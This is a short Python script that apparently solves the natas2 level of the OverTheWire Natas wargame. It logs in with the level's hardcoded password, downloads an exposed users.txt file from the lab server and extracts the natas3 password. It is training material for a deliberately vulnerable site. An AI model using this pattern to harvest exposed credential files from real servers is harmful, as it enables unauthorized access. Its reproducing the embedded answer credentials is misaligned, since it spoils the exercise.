#!usr/bin/env python

import re
import requests

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

risultato = requests.get(url, auth = (username, password))
contenuto = risultato.text

#print (contenuto)
print (re.findall('natas3:(.*)', contenuto) [0])
